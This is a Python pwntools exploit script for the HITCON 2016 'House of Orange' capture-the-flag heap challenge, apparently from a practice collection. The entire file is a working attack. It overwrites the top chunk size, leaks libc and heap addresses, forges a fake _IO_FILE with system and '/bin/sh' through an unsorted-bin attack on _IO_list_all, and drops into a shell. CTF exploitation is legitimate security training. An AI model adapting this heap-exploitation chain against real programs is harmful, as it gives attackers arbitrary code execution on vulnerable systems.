from pwn  import *
import functools

sh = process("./data/bin/heap23_39_hitcon_2016_houseoforange")
LOG_ADDR = lambda x, y: log.success('{} ===> {}'.format(x, hex(y)))
int16 = functools.partial(int, base=16)
context.arch="amd64"
context.os="linux"
context.endian="little"

main_arena_offset = 0x3c4b20

elf = ELF("./data/bin/heap23_39_hitcon_2016_houseoforange")
libc = elf.libc

def build_house(length:int, name, price:int=0xff, color:int=1):
    sh.sendlineafter("Your choice : ", "1")
    sh.sendlineafter("Length of name :", str(length))
    sh.sendafter("Name :", name)
    sh.sendlineafter("Price of Orange:", str(price))
    sh.sendlineafter("Color of Orange:", str(color))
    sh.recvuntil("Finish\n")

def see_house():
    sh.sendlineafter("Your choice : ", "2")
    name_msg = sh.recvline_startswith("Name of house : ")
    price_msg = sh.recvline_startswith("Price of orange : ")
    log.success("name_msg:{}\nprice_msg:{}".format(name_msg, price_msg))
    return name_msg, price_msg


def upgrade_house(length:int, name, price:int=0xff, color:int=1):
    sh.sendlineafter("Your choice : ", "3")
    sh.sendlineafter("Length of name :", str(length))
    sh.sendafter("Name:", name)
    sh.sendlineafter("Price of Orange: ", str(price))
    sh.sendlineafter("Color of Orange: ", str(color))
    sh.recvuntil("Finish\n")

build_house(0x10, "aaaa")

# change the size of top_chunk to 0xfa1
upgrade_house(0x100, b"a" * 0x38 + p64(0xfa1))

# house of orange
build_house(0x1000, "cccc")

# leak addr
build_house(0x400, b"a" * 8)
msg, _ = see_house()
leak_libc_addr = msg[0x18: 0x18+6]
leak_libc_addr = u64(leak_libc_addr.ljust(8, b"\x00"))

LOG_ADDR("leak_libc_addr", leak_libc_addr)
libc_base_addr = leak_libc_addr - main_arena_offset - 1640
LOG_ADDR("libc_base_addr", libc_base_addr)
io_list_all_addr = libc_base_addr + libc.sym["_IO_list_all"]

upgrade_house(0x10, "a" * 0x10)
msg, _ = see_house()
heap_addr = msg[0x20:0x26]
heap_addr = u64(heap_addr.ljust(8, b"\x00"))
LOG_ADDR("heap_addr", heap_addr)

payload = flat(p64(0) * 3 + p64(libc_base_addr + libc.sym["system"]),
                0x400 * "\x00",
                "/bin/sh\x00", 
                0x61,
                0, 
                io_list_all_addr-0x10,
                0, 
                0x1,  # _IO_write_ptr
                0xa8 * b"\x00",
                heap_addr+0x10
                )
upgrade_house(0x600, payload)
sh.sendlineafter("Your choice : ", "1")
sh.interactive()